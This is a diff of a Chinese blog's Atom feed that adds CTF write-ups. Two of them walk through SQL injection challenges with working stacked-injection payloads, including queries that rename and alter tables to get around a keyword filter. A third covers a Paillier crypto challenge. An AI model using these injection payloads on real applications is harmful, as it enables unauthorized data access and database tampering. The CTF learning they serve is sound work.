@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-04-20T01:34:57.953Z</updated>
+  <updated>2020-04-27T07:14:06.812Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,100 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>SUCTF-EasySQL</title>
+    <link href="http://yoursite.com/2020/04/27/SUCTF-EasySQL/"/>
+    <id>http://yoursite.com/2020/04/27/SUCTF-EasySQL/</id>
+    <published>2020-04-27T07:00:00.000Z</published>
+    <updated>2020-04-27T07:14:06.812Z</updated>
+    
+    <content type="html"><![CDATA[<p>堆叠注入</p><p>分析后端语句 </p><p>由于输入1有回显，0无回显，所以可能存在||的操作，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知，需要注意的是，此时的||起到的作用是or的作用。 </p><p>解法1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure><p>此时sql语句变为<code>$select *,1||flag from Flag</code></p><p>解法2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode&#x3D;pipes_as_concat;select 1</span><br></pre></td></tr></table></figure><p>其中set sql_mode=pipes_as_concat;的作用为将||的作用由or变为拼接字符串 ，因此能将前一个字段的查询结果和后一个字段查询结果进行拼接 </p><p><img src="/2020/04/27/SUCTF-EasySQL/SUCTF-easysql.png" alt="运行截图"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        
+        
+          &lt;p&gt;堆叠注入&lt;/p&gt;
+&lt;p&gt;分析后端语句 &lt;/p&gt;
+&lt;p&gt;由于输入1有回显，0无回显，所以可能存在||的操作，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from
+        
+      
+    
+    </summary>
+    
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="WEB" scheme="http://yoursite.com/tags/WEB/"/>
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>安恒4月赛-从not_RSA了解Paillier加密算法</title>
+    <link href="http://yoursite.com/2020/04/27/%E5%AE%89%E6%81%924%E6%9C%88%E8%B5%9B-%E4%BB%8Enot_RSA%E4%BA%86%E8%A7%A3Paillier%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
+    <id>http://yoursite.com/2020/04/27/%E5%AE%89%E6%81%924%E6%9C%88%E8%B5%9B-%E4%BB%8Enot_RSA%E4%BA%86%E8%A7%A3Paillier%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</id>
+    <published>2020-04-27T07:00:00.000Z</published>
+    <updated>2020-04-26T00:58:38.162Z</updated>
+    
+    <content type="html"><![CDATA[<p>首先了解一下<a href="https://blog.csdn.net/qq_26816591/article/details/82944696" target="_blank" rel="noopener">Paillier加密算法</a>，也是同态加密算法的一种</p><ol><li>选取大素数p，q （p，q相近）</li><li>n=p*q，λ = (p-1)*(q-1)</li><li>随机数g</li><li>PK=(n, g) , SK=λ</li></ol><p>加密：$C = g^{m} * r^{n}\mod n^{2}$, 其中r为随机数(1,n)</p><p>解密：$m=L(C^{λ}\mod n^{2})/L(g^{λ}\mod n^{2})\mod n$，其中L(x) = (x-1)/n</p><p>原题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime <span class="keyword">as</span> getprime ,long_to_bytes,bytes_to_long,inverse</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,p,q</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> isprime,nextprime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">n=p*q</span><br><span class="line">g=n+<span class="number">1</span></span><br><span class="line">r=random.randint(<span class="number">1</span>,n)</span><br><span class="line"></span><br><span class="line">c=(pow(g,m,n*n)*pow(r,n,n*n))%(n*n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"c=%d"</span>%(c)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"n=%d"</span>%(n)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">c=29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549</span></span><br><span class="line"><span class="string">n=6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>解法：利用yafu分解n得到p，q</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        
+        
+          &lt;p&gt;首先了解一下&lt;a href=&quot;https://blog.csdn.net/qq_26816591/article/details/82944696&quot; target=&quot;_blank&quot;
+        
+      
+    
+    </summary>
+    
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>强网杯-随便注</title>
+    <link href="http://yoursite.com/2020/04/25/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/"/>
+    <id>http://yoursite.com/2020/04/25/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/</id>
+    <published>2020-04-25T07:00:00.000Z</published>
+    <updated>2020-04-27T07:15:53.930Z</updated>
+    
+    <content type="html"><![CDATA[<p>首先判断一下有无注入：输入1’发现不回显，然后1’ #显示正常，应该是存在sql注入了 </p><p>过滤了<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p><p>尝试堆叠注入 <code>?inject=1&#39;;show databases;%23</code></p><p>查看所有的表 <code>?inject=1&#39;;show tables;%23</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;show columns from &#96;1919810931114514&#96;;%23</span><br></pre></td></tr></table></figure><p>发现flag在这张表中</p><p>既然没过滤 alert 和 rename，那就可以把表和列改名。先把 words 改为 words1，再把数字表改为 words，然后把新的 words 表里的 flag 列改为 id ，这样就可以直接查询 flag 了 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?inject&#x3D;1&#39;;RENAME TABLE &#96;words&#96; TO &#96;words1&#96;;RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23</span><br></pre></td></tr></table></figure><p>最后<code>/?inject=1&#39; or &#39;1&#39;=&#39;1</code>获取flag</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        
+        
+          &lt;p&gt;首先判断一下有无注入：输入1’发现不回显，然后1’ #显示正常，应该是存在sql注入了 &lt;/p&gt;
+&lt;p&gt;过滤了&lt;code&gt;return
+        
+      
+    
+    </summary>
+    
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="WEB" scheme="http://yoursite.com/tags/WEB/"/>
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>2020数字中国虎符CTF之GM&amp;McEliece</title>
